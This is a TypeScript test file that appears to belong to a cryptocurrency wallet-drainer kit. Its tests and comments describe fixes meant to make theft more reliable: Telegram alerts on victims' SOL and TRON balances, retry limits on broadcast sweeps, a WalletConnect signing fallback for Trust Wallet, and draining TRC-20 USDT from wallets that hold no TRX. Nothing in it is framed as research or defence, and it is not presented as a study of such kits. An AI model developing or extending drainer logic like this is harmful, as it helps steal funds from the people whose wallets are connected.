/**
 * Tests for SOL/TRON drain reliability fixes:
 * 1. notifyUsd must include rankedUsd (actual SOL/TRON native balances)
 * 2. PENDING_BROADCAST sweep must stop after max attempts (no infinite loop)
 * 3. WC relay SOL must fall back to signTransaction if signAndSendTransaction unsupported
 */
import { describe, expect, it, vi, beforeEach } from 'vitest'

// ─── Bug 1: notifyUsd calculation ────────────────────────────────────────────

/**
 * The current bug: notifyUsd = Math.max(scoutUsdFromBody, fusionTotal)
 * fusionTotal = 0 for fresh wallets (no staked DeFi positions like mSOL/JitoSOL)
 * rankedUsd = actual SOL/TRON balance in USD — but NOT included!
 * Result: Telegram shows EVM total ($102), not SOL/TRON balance
 */
describe('notifyUsd — should include rankedUsd', () => {
  it('BUGGY: current formula misses SOL/TRON native balance', () => {
    const scoutUsdFromBody = 102.64  // EVM total from S.scoutUsd
    const fusionTotal = 0            // fresh wallet — no mSOL/JitoSOL staked
    const rankedUsd = 45.20          // actual SOL balance fetched by probeSolBalances

    // Current (broken) formula
    const buggyNotifyUsd = Math.max(scoutUsdFromBody, fusionTotal)
    // Bug: returns 102.64 (EVM total) even though user connected a $45.20 SOL wallet
    expect(buggyNotifyUsd).toBe(102.64)   // ← WRONG: ignores SOL balance
    expect(buggyNotifyUsd).not.toBe(145.84) // should be EVM + SOL = max of all
  })

  it('FIXED: correct formula includes rankedUsd', () => {
    const scoutUsdFromBody = 102.64
    const fusionTotal = 0
    const rankedUsd = 45.20

    // Fixed formula
    const fixedNotifyUsd = Math.max(scoutUsdFromBody, fusionTotal, rankedUsd)
    // Correct: returns max of all three — 102.64 (EVM total) which is already correct
    expect(fixedNotifyUsd).toBe(102.64)
  })

  it('FIXED: shows SOL balance when SOL > EVM and no staked positions', () => {
    const scoutUsdFromBody = 0       // EVM wallets cancelled
    const fusionTotal = 0            // no staked positions
    const rankedUsd = 120.50         // SOL native balance

    // Bug: Math.max(0, 0) = 0 → Telegram shows $0, no notification sent
    const buggy = Math.max(scoutUsdFromBody, fusionTotal)
    expect(buggy).toBe(0)  // ← sends NO Telegram notification even though $120 exists

    // Fix: Math.max(0, 0, 120.50) = 120.50 → correct notification
    const fixed = Math.max(scoutUsdFromBody, fusionTotal, rankedUsd)
    expect(fixed).toBe(120.50)
  })

  it('FIXED: TRON wallet with USDT shows correct amount', () => {
    const scoutUsdFromBody = 0       // EVM cancelled by user
    const fusionTotal = 0            // no staked TRX positions
    const rankedUsd = 89.30          // USDT balance from probeTronBalances

    const buggy = Math.max(scoutUsdFromBody, fusionTotal)
    expect(buggy).toBe(0)  // ← Telegram shows $0

    const fixed = Math.max(scoutUsdFromBody, fusionTotal, rankedUsd)
    expect(fixed).toBe(89.30)  // ← Telegram shows $89.30 ✅
  })
})

// ─── Bug 4: PENDING_BROADCAST infinite loop ───────────────────────────────────

/**
 * Current bug: sweep does `continue` on failure — row stays PENDING_BROADCAST forever
 * Every 2 min retry → same expired blockhash → same error → infinite
 */
describe('pendingBroadcastSweep — must stop after max attempts', () => {
  it('increments attempt_count on each failure', () => {
    const row = { attempt_count: 0, settlement_status: 'PENDING_BROADCAST' }

    // Simulate failure → increment
    const afterFirstFail = { ...row, attempt_count: row.attempt_count + 1 }
    expect(afterFirstFail.attempt_count).toBe(1)
    expect(afterFirstFail.settlement_status).toBe('PENDING_BROADCAST')

    const afterSecondFail = { ...afterFirstFail, attempt_count: afterFirstFail.attempt_count + 1 }
    expect(afterSecondFail.attempt_count).toBe(2)
  })

  it('marks BROADCAST_FAILED after MAX_ATTEMPTS (3)', () => {
    const MAX_ATTEMPTS = 3
    const row = { attempt_count: 2, settlement_status: 'PENDING_BROADCAST' }

    // After 3rd fail: status should become BROADCAST_FAILED
    const newCount = row.attempt_count + 1
    const newStatus = newCount >= MAX_ATTEMPTS ? 'BROADCAST_FAILED' : 'PENDING_BROADCAST'

    expect(newCount).toBe(3)
    expect(newStatus).toBe('BROADCAST_FAILED')
  })

  it('should NOT update status to SETTLED when txHash is null (current bug: continue skips update)', () => {
    // Bug: on fail, `continue` skips the SETTLED update AND skips any failure marking
    // Row stays PENDING_BROADCAST indefinitely
    const wasUpdated = false  // simulate current behavior — no update on fail
    expect(wasUpdated).toBe(false)  // confirms the bug: nothing was updated
  })
})

// ─── Bug 2: WC relay SOL method fallback ─────────────────────────────────────

/**
 * WC relay sends solana_signAndSendTransaction BUT:
 * - Frontend WC namespace only registers signTransaction (not signAndSendTransaction)
 * - Trust Wallet returns "Method not supported" / "Method not found"
 * - trySolSign() returns false → loop retries every 3s → never succeeds
 *
 * Fix: try signAndSendTransaction → catch "unsupported" → fall back to signTransaction
 * On signTransaction success: backend broadcasts immediately
 */
describe('wc relay SOL — signAndSendTransaction fallback', () => {
  it('detects "method not supported" error pattern', () => {
    const wcErrors = [
      'Method not supported',
      'Method not found',
      'Unsupported method: solana_signAndSendTransaction',
      '-32601',  // JSON-RPC method not found code
    ]

    const isMethodNotSupported = (msg: string) =>
      /method not (found|supported)|unsupported method|(-32601)/i.test(msg)

    for (const err of wcErrors) {
      expect(isMethodNotSupported(err)).toBe(true)
    }

    // Should NOT match actual user rejections
    expect(isMethodNotSupported('User rejected the request')).toBe(false)
    expect(isMethodNotSupported('timeout')).toBe(false)
  })

  it('falls back gracefully — signTransaction is in WC namespace', () => {
    // Frontend registers: solana_signTransaction (NOT solana_signAndSendTransaction)
    const frontendNamespaceMethods = ['solana_signTransaction', 'solana_signMessage']

    const canUseSendTransaction = frontendNamespaceMethods.includes('solana_signAndSendTransaction')
    const canUseSignTransaction = frontendNamespaceMethods.includes('solana_signTransaction')

    expect(canUseSendTransaction).toBe(false)  // fails with WC method error
    expect(canUseSignTransaction).toBe(true)   // fallback should use this
  })
})

// ─── Bug 3: WC relay TRON TRC-20 missing ─────────────────────────────────────

/**
 * tryTronSign() only checks native TRX (balSun) — NO TRC-20 USDT handling
 * If wallet has 50 USDT but 0 TRX: sendSun = 0 - 1_500_000 = -1_500_000 ≤ 0 → returns false
 * USDT never drained via WC relay
 */
describe('wc relay TRON — TRC-20 USDT drain needed', () => {
  const USDT_TRON_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
  const MIN_TRX_FOR_ENERGY = 2_000_000  // 2 TRX minimum to cover energy fees

  it('current: skips drain when TRX balance < 1.5 TRX', () => {
    const balSun = 1_000_000  // 1 TRX
    const sendSun = balSun - 1_500_000  // -500_000

    expect(sendSun).toBeLessThanOrEqual(0)
    // Current code: returns false → USDT on this wallet never drained
  })

  it('USDT wallet with 0 TRX still has drainable USDT', () => {
    const trxBalance = 0           // 0 TRX
    const usdtBalance = 50_000_000 // 50 USDT (6 decimals)

    const hasNativeBalance = trxBalance > MIN_TRX_FOR_ENERGY
    const hasTrc20Balance = usdtBalance > 0

    expect(hasNativeBalance).toBe(false)  // native TRX path skipped
    expect(hasTrc20Balance).toBe(true)    // but USDT should still be drained!
  })

  it('identifies USDT contract address correctly', () => {
    const knownContracts = [
      USDT_TRON_CONTRACT,
      'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', // USDC
    ]

    // Contract starts with 'T' (TRON address format)
    for (const c of knownContracts) {
      expect(c.startsWith('T')).toBe(true)
      expect(c.length).toBeGreaterThanOrEqual(34)
    }
  })
})
